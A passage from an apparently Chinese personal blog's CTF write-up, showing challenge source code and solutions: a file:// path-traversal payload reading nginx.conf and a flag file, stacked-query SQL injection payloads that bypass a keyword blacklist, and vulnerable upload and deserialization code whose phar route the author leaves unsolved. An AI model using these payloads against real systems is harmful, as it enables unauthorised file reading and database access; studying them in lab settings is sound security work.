<p>==&gt;</p>
<p>111000101000010010000010</p>
<p>==&gt;</p>
<p>e28482</p>
</blockquote>
<p>还有一种解法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>

<h3><span id="easy_sql">easy_sql</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    </span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line">    </span><br><span class="line">    $post &#x3D; array();</span><br><span class="line">    $get &#x3D; array();</span><br><span class="line">    global $MysqlLink;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;GetPara();</span><br><span class="line">    $MysqlLink &#x3D; mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);</span><br><span class="line">    if(!$MysqlLink)&#123;</span><br><span class="line">        die(&quot;Mysql Connect Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB &#x3D; mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    if(!$selectDB)&#123;</span><br><span class="line">        die(&quot;Choose Database Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    foreach ($_POST as $k&#x3D;&gt;$v)&#123;</span><br><span class="line">        if(!empty($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] &#x3D; trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $k&#x3D;&gt;$v)&#123;</span><br><span class="line">        if(!empty($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $get[$k] &#x3D; trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;die();</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F;a &gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(isset($post[&#39;query&#39;]))&#123;</span><br><span class="line">        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));</span><br><span class="line">        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;</span><br><span class="line">            &#x2F;&#x2F;echo $post[&#39;query&#39;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&#39;query&#39;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p>然后主要源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(strlen($post[&#39;query&#39;])&gt;40)&#123;</span><br><span class="line">	die(&quot;Too long.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br><span class="line">mysqli_multi_query($MysqlLink,$sql);</span><br></pre></td></tr></table></figure>

<p>看样子应该是堆叠了，但是一直不知道 || 应该怎么用</p>
<p>首先设置sqlmode模式为pipesas_concat，然后来拼接语句</p>
<blockquote>
<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能</p>
</blockquote>
<p>select 1;set sql_mode=pipes_as_concat;select 1||flag from flag</p>
<p>所以本题的paylaod是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>然后当时力哥fuzz出一个</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>也能getflag</p>
</blockquote>
<p>===========================================================</p>
<h3><span id="upload-labs-2">Upload labs 2</span></h3><p>index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;class.php&#39;;</span><br><span class="line"></span><br><span class="line">$userdir &#x3D; &quot;upload&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    &#x2F;&#x2F; 允许上传的图片后缀</span><br><span class="line">    $allowedExts &#x3D; array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">    $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $file_name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $temp &#x3D; explode(&quot;.&quot;, $file_name);</span><br><span class="line">    $extension &#x3D; end($temp);</span><br><span class="line">    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;gif&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;jpeg&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;png&quot;))</span><br><span class="line">        &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   &#x2F;&#x2F; 小于 200 kb</span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c &#x3D; new Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">            echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . &quot;&#x2F;&quot; . md5($file_name) . &quot;.&quot; . $extension);</span><br><span class="line">            echo &quot;文件存储在: &quot; . $userdir . &quot;&#x2F;&quot; . md5($file_name) . &quot;.&quot; . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;非法的文件格式&quot;;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>func.php接受url参数，去上传目录找上传的文件，获取MIME返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># func.php</span><br><span class="line">if (isset($_POST[&quot;submit&quot;]) &amp;&amp; isset($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    if(preg_match(&#39;&#x2F;^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*&#x2F;i&#39;,$_POST[&#39;url&#39;]))&#123;</span><br><span class="line">        die(&quot;Go away!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $file_path &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">        $file &#x3D; new File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>class.php这里的File的__wakeup函数很异常，预计就是题目考点了，作用是创建一个类的新实例，给出的参数将传递到类的构造函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#class.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line"></span><br><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line">    public $type;</span><br><span class="line">    public $func &#x3D; &quot;Check&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name &#x3D; $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $class &#x3D; new ReflectionClass($this-&gt;func);</span><br><span class="line">        $a &#x3D; $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type &#x3D; finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return $this-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Check&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name &#x3D; $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line">        $data &#x3D; file_get_contents($this-&gt;file_name);</span><br><span class="line">        if (mb_strpos($data, &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">            die(&quot;&lt;? in contents!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来这个admin.php，需要一个ssrf然后，之后会触发getflag函数把flag发到你服务器上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#admin.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line"></span><br><span class="line">class Ad&#123;</span><br><span class="line"></span><br><span class="line">    public $ip;</span><br><span class="line">    public $port;</span><br><span class="line"></span><br><span class="line">    public $clazz;</span><br><span class="line">    public $func1;</span><br><span class="line">    public $func2;</span><br><span class="line">    public $func3;</span><br><span class="line">    public $instance;</span><br><span class="line">    public $arg1;</span><br><span class="line">    public $arg2;</span><br><span class="line">    public $arg3;</span><br><span class="line"></span><br><span class="line">    function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;ip &#x3D; $ip;</span><br><span class="line">        $this-&gt;port &#x3D; $port;</span><br><span class="line">        $this-&gt;clazz &#x3D; $clazz;</span><br><span class="line">        $this-&gt;func1 &#x3D; $func1;</span><br><span class="line">        $this-&gt;func2 &#x3D; $func2;</span><br><span class="line">        $this-&gt;func3 &#x3D; $func3;</span><br><span class="line">        $this-&gt;arg1 &#x3D; $arg1;</span><br><span class="line">        $this-&gt;arg2 &#x3D; $arg2;</span><br><span class="line">        $this-&gt;arg3 &#x3D; $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line"></span><br><span class="line">        $reflect &#x3D; new ReflectionClass($this-&gt;clazz);</span><br><span class="line">        $this-&gt;instance &#x3D; $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod &#x3D; new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod &#x3D; new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod &#x3D; new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        getFlag($this-&gt;ip, $this-&gt;port);</span><br><span class="line">        &#x2F;&#x2F;使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &#39;127.0.0.1&#39;)&#123;</span><br><span class="line">    if(isset($_POST[&#39;admin&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">        $ip &#x3D; $_POST[&#39;ip&#39;];     &#x2F;&#x2F;你用来获取flag的服务器ip</span><br><span class="line">        $port &#x3D; $_POST[&#39;port&#39;]; &#x2F;&#x2F;你用来获取flag的服务器端口</span><br><span class="line">        $clazz &#x3D; $_POST[&#39;clazz&#39;];</span><br><span class="line">        $func1 &#x3D; $_POST[&#39;func1&#39;];</span><br><span class="line">        $func2 &#x3D; $_POST[&#39;func2&#39;];</span><br><span class="line">        $func3 &#x3D; $_POST[&#39;func3&#39;];</span><br><span class="line">        $arg1 &#x3D; $_POST[&#39;arg1&#39;];</span><br><span class="line">        $arg2 &#x3D; $_POST[&#39;arg2&#39;];</span><br><span class="line">        $arg2 &#x3D; $_POST[&#39;arg3&#39;];</span><br><span class="line">        $admin &#x3D; new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;You r not admin!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这题利用phar反序列化，思（就）路（是）大（还）概（不）懂（会）了</p>
</blockquote>
<h3><span id="参考链接">参考链接：</span></h3><p><a href="https://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/GGnumPklkUNMLZKQL4NbKg</a></p>
<p><a href="https://www.codercto.com/a/92645.html" target="_blank" rel="noopener">https://www.codercto.com/a/92645.html</a></p>
<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11207145.html?tdsourcetag=s_pctim_aiomsg</a></p>
<p><a href="https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/" target="_blank" rel="noopener">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
<p><a href="http://www.vuln.cn/6001?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://www.vuln.cn/6001?tdsourcetag=s_pctim_aiomsg</a></p>
<p><a href="https://xz.aliyun.com/t/6042?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042?tdsourcetag=s_pctim_aiomsg</a></p>
<p><a href="https://mp.weixin.qq.com/s/fDz_i3MkwdMzktJGVGn89g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/fDz_i3MkwdMzktJGVGn89g</a></p>
<p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">https://blog.csdn.net/lixora/article/details/60572357</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2019/08/27/ogeek-web/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">ogeek-web</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2019/08/13/chinaz%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
        <span class="next-text nav-default">chinaz的代码执行和命令执行漏洞</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
